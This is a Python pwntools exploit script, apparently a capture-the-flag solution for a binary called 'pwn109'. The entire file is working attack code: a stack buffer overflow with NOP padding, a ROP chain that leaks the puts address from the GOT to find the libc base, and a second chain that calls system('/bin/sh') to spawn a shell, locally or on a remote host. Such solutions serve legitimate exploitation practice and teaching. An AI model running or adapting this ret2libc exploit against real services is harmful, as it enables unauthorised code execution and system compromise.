import sys
from pwn import *
from struct import *

exe = './pwn109.pwn109'
binary = context.binary = ELF(exe,checksec=False)

libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
# libc = binary.libc # use it locally

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

io = start()

RET = 0x40101a   # for stack alignment
POP_RDI = 0x4012a3

exploit = b""
exploit += b"\x90"*40
exploit += p64(RET)
exploit += p64(POP_RDI)

exploit += p64(binary.got['puts'])  # the address of got puts is the parameter
exploit += p64(binary.plt['puts'])  # call puts via plt
exploit += p64(binary.sym['main'])  # return address (will be popped into eip when printf returns)

io.recvuntil(b'Go ahead \xf0\x9f\x98\x8f')
data = io.recvline()
io.sendline(exploit)

puts_leak = u64(io.recv(6) + b'\x00\x00')

# log.success(f'LIBC base: {hex(puts_leak)}') # uncomment this to detect target's libc version

libc.address = puts_leak - libc.sym['puts'] # comment this when you try to find libc version
log.success(f'LIBC base: {hex(libc.address)}') # comment this when you try to find libc version

rop = ROP(libc)
rop.call(rop.ret)     # Stack align with extra 'ret' to deal with movaps issue
rop.system(next(libc.search(b'/bin/sh')), 0, 0)

io.recvuntil(b'Go ahead \xf0\x9f\x98\x8f')
io.recvline()
io.sendline(b'\x90'*40 + rop.chain())

io.clean()
io.interactive()
